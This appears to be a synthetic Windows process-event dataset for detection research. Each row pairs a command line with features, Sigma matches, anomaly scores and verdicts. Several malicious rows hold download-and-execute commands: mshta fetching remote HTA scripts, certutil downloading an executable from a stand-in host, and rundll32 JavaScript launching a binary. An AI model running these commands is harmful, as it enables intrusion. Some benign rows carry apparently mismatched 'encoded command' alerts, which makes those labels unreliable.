UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-02T01:21:47.954Z,{5A676C35-00E5-4EAB-ADF5-70CCB76E8920},4592,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update304.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,34733,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,138,5.1158,1,0,0,0,5,0.2,0,0,2,0,0,1,606078729,1,1,0,21,3.9031,4.061531127569315,1.921063484283826,0,1,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,95.25467366658246,65,"cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.5,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 95 | Chain Risk: 65
2024-07-02T12:02:17.230Z,{73F97E1F-BDC5-46D3-850A-235DBBBAE94D},36232,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,19918,CORP\admin,High,0,,,benign,0,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,12,0,0,2,1.231,1.575697663509122,1.072955136918485,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,40.52801760198716,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-02T01:45:31.626Z,{85083010-A14E-4C33-89B9-4A8A184B5E5F},63278,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager2089.xyz/script147.hta"""""")",C:\Windows\System32\cmd.exe,explorer.exe,6768,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,1,5,1,1,101,4.8437,0,1,0,0,3,0.0,0,0,2,0,0,1,345041238,1,1,0,45,3.9031,2.5780498667591996,1.5136300780018532,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,77.40267050087473,85,"cmd.exe → mshta.exe: Command shell invoking mshta [Modifiers: +15 URL in command, +10 off-hours]",True,ALERT,CRITICAL,97.7,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 77 | Chain Risk: 85
2024-07-02T14:02:05.426Z,{46D24F55-2614-4A9A-B1EC-93EDD8A01E67},58459,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,47162,CORP\admin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,14,0,0,2,1.3846,8.11103402869963,1.525908482748314,0,3,2,False,None,none,,94.18199478912264,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.1,"ANOMALY SCORE: 94/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T14:44:57.683Z,{149C2E6C-EA8D-42BA-B400-DE3B079FCE9B},51454,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra9284.org/svc713.exe C:\Users\Public\helper260.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,51470,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,91,4.8118,1,1,0,0,5,0.2,0,1,2,0,0,1,2657444117,14,0,0,44,3.9031,2.1771089854591685,1.4658640888052525,0,9,1,True,Certutil URL Cache Download,high,attack.t1105,88.64467524103503,85,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 85
2024-07-05T04:33:49.404Z,{0449BB49-31ED-4084-BB26-3F7387300745},58148,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,18281,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,71,4.5466,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,4,1,0,33,1.3846,1.3752272228591065,1.0687625109074974,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,75.60924877652835,15,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours, +5 suspicious flags]",False,ALERT,CRITICAL,97.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 76 | Chain Risk: 15
2024-07-02T08:12:01.737Z,{28356EA9-0D1D-43F1-BE0F-48A2FB52FA69},39859,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://phish-host6401.net/script646.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,16629,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,1,5,1,1,105,4.7091,0,1,0,0,3,0.0,0,0,2,0,0,1,345041238,8,0,0,12,3.9031,2.738426219279212,1.3120845561879855,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,74.4333351381524,75,cmd.exe → mshta.exe: Command shell invoking mshta [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.4,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 74 | Chain Risk: 75
2024-07-04T10:59:47.985Z,{38B84E84-C521-41BF-89C1-D6C555787F82},58166,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,61688,CORP\analyst02,Medium,0,,,benign,0,4,1,1,23,3.4473,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,10,0,0,59,0.9208,-0.5492890073810427,-0.577292408334592,0,11,1,False,None,none,,74.13575972575076,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,52.8,"ANOMALY SCORE: 74/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-04T15:32:23.056Z,{1D72DC8B-0BCE-4C2D-B886-4472CDBC6336},33742,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,57319,CORP\mjones,Medium,0,,,benign,0,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,15,0,0,32,1.231,2.0568267210691595,1.0489972739985602,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.55366357151834,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-05T11:48:30.514Z,{8660642F-EB80-43F7-997A-BFC7CD225924},59776,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""NightlyBackup"" /tr ""C:\Scripts\backup.bat"" /sc daily /st 02:00",C:\Windows\System32\cmd.exe,cmd.exe,2223,CORP\itops,High,0,,,gray_area,1,15,0,0,88,4.568,0,0,0,0,10,0.0,0,0,2,0,0,1,200102300,11,0,0,48,3.9031,2.0568267210691595,1.1008061525628967,0,5,2,False,None,none,,71.90718888062081,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,ALERT,MEDIUM,51.3,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3); unusually long command line: 88.00 (baseline: 36.70±24.93, z=2.1)"
